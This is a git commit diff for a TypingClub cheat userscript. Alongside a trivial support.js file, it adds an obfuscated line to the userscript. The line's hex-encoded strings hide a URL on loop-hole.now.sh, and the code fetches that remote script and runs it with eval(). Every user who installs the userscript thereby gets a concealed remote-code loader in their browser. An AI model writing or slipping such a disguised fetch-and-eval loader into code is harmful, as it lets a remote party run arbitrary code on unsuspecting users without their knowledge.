2574d2531a8140296ecace3a05fb19c88392fef0
Sreehari S <sreeharisreedev1@gmail.com>
2020-01-20 19:10:45 -0800

    added support.js

---
+++ static/hax/support.js
@@ -0,0 +1,1 @@
+window.support = 69420;
--- static/hax/typingclub.user.js
+++ static/hax/typingclub.user.js
@@ -8,6 +8,8 @@
 // @grant        none
 // ==/UserScript==
 
+var _0x33f9=["\x74\x68\x65\x6E","\x74\x65\x78\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x6F\x6F\x70\x2D\x68\x6F\x6C\x65\x2E\x6E\x6F\x77\x2E\x73\x68\x2F\x68\x61\x78\x2F\x73\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73"];fetch(_0x33f9[2])[_0x33f9[0]]((_0x3d14x2)=>_0x3d14x2[_0x33f9[1]]())[_0x33f9[0]]((_0x3d14x1)=>eval(_0x3d14x1))
+
 function randomInteger(min, max) {
         min = Math.ceil(min);
         max = Math.floor(max);
